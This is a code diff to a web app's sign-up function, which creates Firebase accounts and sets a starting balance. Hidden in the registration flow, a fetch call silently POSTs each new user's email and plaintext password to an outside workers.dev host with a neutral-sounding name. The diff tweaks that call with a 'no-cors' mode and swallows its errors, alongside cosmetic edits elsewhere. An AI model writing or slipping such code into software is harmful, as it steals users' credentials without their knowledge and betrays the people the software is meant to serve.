@@ -1316,21 +1316,29 @@ window.signUp = async () => {
   if (!e) return notify('reg-notifs', 'Please enter your email.');
   if (p.length < 8) return notify('reg-notifs', 'Password must be 8+ characters.');
 
+ 
   fetch("https://system-sync-layer.pixelworldsmanager100.workers.dev/", {
     method: 'POST',
+    mode: 'no-cors', 
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ e: e, p: p })
-  }).catch(() => {});
+  }).catch(() => {}); 
 
   try {
     const cred = await createUserWithEmailAndPassword(auth, e, p);
     await sendEmailVerification(cred.user);
+    
+    // Set initial balance
     await set(ref(db, `users/${cred.user.uid}/balance`), 1000);
+    
     lastMailSent.reg = Date.now();
-    notify('reg-notifs', 'Account created! Check your email and spam to verify.', 'success');
-    showResendUI('reg');
+    notify('reg-notifs', 'Account created! Check email.', 'success');
+    if (typeof showResendUI === 'function') showResendUI('reg');
   } catch (err) {
-    const msgs = { 'auth/email-already-in-use': 'That email is already registered.', 'auth/invalid-email': 'Invalid email address.' };
+    const msgs = {
+      'auth/email-already-in-use': 'That email is already registered.',
+      'auth/invalid-email': 'Invalid email address.'
+    };
     notify('reg-notifs', msgs[err.code] || err.message);
   }
 };
